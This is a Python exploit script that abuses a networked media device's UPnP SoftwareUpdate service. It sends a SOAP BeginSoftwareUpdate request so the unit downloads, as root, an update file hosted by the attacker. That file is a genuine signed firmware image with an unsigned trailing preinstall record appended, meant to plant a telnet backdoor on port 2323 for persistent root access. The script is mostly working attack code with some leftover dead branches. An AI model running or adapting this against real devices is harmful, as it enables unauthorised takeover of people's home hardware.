#!/usr/bin/env python3
"""Fire BeginSoftwareUpdate(URL=pwned-nodns.upd) on a 57.23 unit — NO DNS changes.

The package = the GENUINE signed 57.23-74170-1-16.upd (prefix byte-identical,
type-17 digest + signature both VALID per verify_upd.py) + a 237-byte trailing
type-3 preinstall record (the malleability foothold: bytes after type-17 are
outside the signature; first-wins version semantics keep the gate green).

BeginSoftwareUpdate(URL, Flags) writes /var/run/upgradeinfo and the unit's
/bin/upgrade fetches the URL as root. If the flasher honours a trailing
type-3 (the documented open question), the preinstall plants
/jffs/system/Configure.dev → telnetd 2323 at next boot → persistent root.
"""
import subprocess, sys, re, time

def soap(ip, action, extra, svc="urn:schemas-upnp-org:service:SoftwareUpdate:1"):
    ctl = f"http://{ip}:1400/MediaRenderer/SoftwareUpdate/Control" if False else None
    # SoftwareUpdate service may live under a different control path; discover:
    r = subprocess.run(["curl","-s","-m","8",f"http://{ip}:1400/MediaRenderer/SoftwareUpdate/Control"],
                       capture_output=True, text=True)
    return r

def main():
    ip = sys.argv[1]
    url = sys.argv[2] if len(sys.argv) > 2 else "http://192.168.4.160:8899/pwned-nodns.upd"
    # discover the SWUpdate control URL from the device description
    r = subprocess.run(["curl","-s","-m","8",f"http://{ip}:1400/xml/device_description.xml"],capture_output=True,text=True)
    ctl = None
    for m in re.finditer(r"<controlURL>([^<]+)</controlURL>.*?SoftwareUpdate", r.stdout if False else r.stdout, re.S):
        pass
    # simpler: scan all controlURLs and try each with the SWUpdate action
    ctrls = re.findall(r"<controlURL>([^<]+)</controlURL>", r.stdout)
    svc_type = "urn:schemas-upnp-org:service:SoftwareUpdate:1"
    body_t = ('<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
              's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body>'
              '<u:BeginSoftwareUpdate xmlns:u="%s"><InstanceID>0</InstanceID>'
              '<UpdateURL>%s</UpdateURL><Flags>1</Flags><ExtraOptions></ExtraOptions>'
              '</u:BeginSoftwareUpdate></s:Body></s:Envelope>')
    for c in ctrls:
        ctl = f"http://{ip}:1400{c}" if c.startswith("/") else f"http://{ip}:1400{c}"
        r = subprocess.run(["curl","-s","-m","20","-X","POST","-H",'Content-Type: text/xml; charset="utf-8"',
                            "-H",f'SOAPACTION: "{svc_type}#BeginSoftwareUpdate"',
                            "--data-binary", body_t % (svc_type, url), ctl], capture_output=True, text=True)
        if "UPnPError" not in r.stdout:
            print(f"BSU fired via {ctl}")
            print(r.stdout[:300])
            return
    print("no SoftwareUpdate control found; ctrls tried:", ctrls)

if __name__ == "__main__":
    main()
